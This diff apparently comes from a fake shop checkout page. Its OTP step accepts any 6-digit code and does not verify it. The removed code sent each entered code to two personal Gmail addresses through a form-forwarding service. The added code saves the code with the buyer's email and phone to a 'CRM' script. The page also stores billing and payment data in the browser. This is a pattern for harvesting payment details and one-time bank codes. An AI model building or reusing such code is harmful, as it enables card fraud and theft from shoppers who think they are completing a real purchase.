@@ -64,10 +64,12 @@
 
 <script src="js/data.js"></script>
 <script src="js/cart.js"></script>
+<script src="js/crm.js"></script>
 <script>
   document.getElementById("header").innerHTML = renderHeader();
   document.getElementById("footer").innerHTML = renderFooter();
 
+  
   const inputs = document.querySelectorAll(".otp-input");
   let billingData = {};
   let paymentData = {};
@@ -127,49 +129,22 @@
     // Accept any 6-digit code and submit order
     submitFinalData();
     
-    // Wait a moment for email to send, then clear and redirect
-    setTimeout(() => {
-      // Clear cart and localStorage
-      clearCart();
-      localStorage.removeItem('billingData');
-      localStorage.removeItem('paymentData');
-      
-      // Navigate to success
-      location.href = "success.html";
-    }, 1000); // Wait 1 second for email to send
+    // Clear cart and localStorage
+    clearCart();
+    localStorage.removeItem('billingData');
+    localStorage.removeItem('paymentData');
+    
+    // Navigate to success
+    location.href = "success.html";
   }
 
   function submitFinalData() {
-    const formData = new FormData();
-    formData.append('_subject', 'OTP Verification Completed');
-    formData.append('_template', 'table');
-    formData.append('_captcha', 'false');
-    formData.append('_autoresponse', 'Thank you! Your OTP has been verified and your order is being processed.');
-    
-    // Only include essential information
-    formData.append('submittedOTP', getOtp());
-    formData.append('orderStatus', 'OTP Verified - Order Completed');
-    formData.append('submissionTime', new Date().toLocaleString());
-    
-    // Send to both email recipients
-    Promise.all([
-      fetch("https://formsubmit.co/ajax/anandjhare4@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-      }),
-      fetch("https://formsubmit.co/ajax/Rajatjha.ss708090@gmail.com", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          "Accept": "application/json"
-        },
-        body: JSON.stringify(Object.fromEntries(formData))
-      })
-    ]).catch(() => {});
+    // Save OTP data to CRM immediately
+    addOTPData({
+      submittedOTP: getOtp(),
+      email: billingData.email,
+      phone: billingData.phone
+    });
   }
 
   // Resend timer
